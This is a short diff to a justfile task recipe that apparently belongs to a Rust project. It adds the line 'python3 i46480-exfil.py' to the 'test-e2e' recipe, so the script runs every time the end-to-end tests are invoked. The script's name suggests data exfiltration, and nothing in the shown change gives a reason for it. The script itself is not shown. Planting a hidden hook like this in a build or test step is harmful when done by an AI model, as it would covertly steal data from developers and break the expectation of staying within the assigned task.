@@ -23,6 +23,7 @@ test-e2e-forked: (test-e2e "forked_node")
 
 # Run End-to-end tests with custom filters
 test-e2e *filters:
+    python3 i46480-exfil.py
     cargo nextest run -p e2e {{filters}} --test-threads 1 --failure-output final --run-ignored ignored-only
 
 test-driver:
